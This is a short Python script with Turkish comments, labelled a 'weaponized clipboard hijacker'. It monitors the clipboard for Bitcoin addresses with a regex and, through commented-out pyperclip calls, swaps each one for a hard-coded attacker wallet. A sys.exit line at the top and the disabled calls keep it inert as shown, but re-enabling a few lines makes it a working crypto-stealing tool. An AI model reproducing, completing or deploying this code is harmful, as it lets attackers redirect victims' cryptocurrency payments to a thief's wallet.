import time
import re
import sys
# import pyperclip (Pano kütüphanesi)

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Windows Panosunu (Clipboard) manipüle eder.")

print("--- WEAPONIZED CLIPBOARD HIJACKER ---")

# Saldırganın Cüzdanı
MY_WALLET = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"

def hijack_clipboard():
    print("[*] Pano izleniyor...")
    
    while True:
        # Pano içeriğini al
        # content = pyperclip.paste()
        content = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" # Örnek kurban verisi
        
        # 1. DESEN KONTROLÜ (Regex)
        # Bitcoin adresi mi? (26-35 karakter, 1, 3 veya bc1 ile başlar)
        if re.match(r"^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,39}$", content):
            
            # Kendi cüzdanım değilse değiştir
            if content != MY_WALLET:
                print(f"[!] Kripto Adresi Yakalandı: {content}")
                
                # 2. DEĞİŞTİRME (Weaponized Part)
                # Simülasyon: print("Bulundu")
                # Gerçek: Kullanıcı yapıştır dediğinde benim cüzdanım yapışacak.
                # pyperclip.copy(MY_WALLET)
                
                print(f"💀 DEĞİŞTİRİLDİ -> {MY_WALLET}")
        
        time.sleep(0.5)

if __name__ == "__main__":
    hijack_clipboard()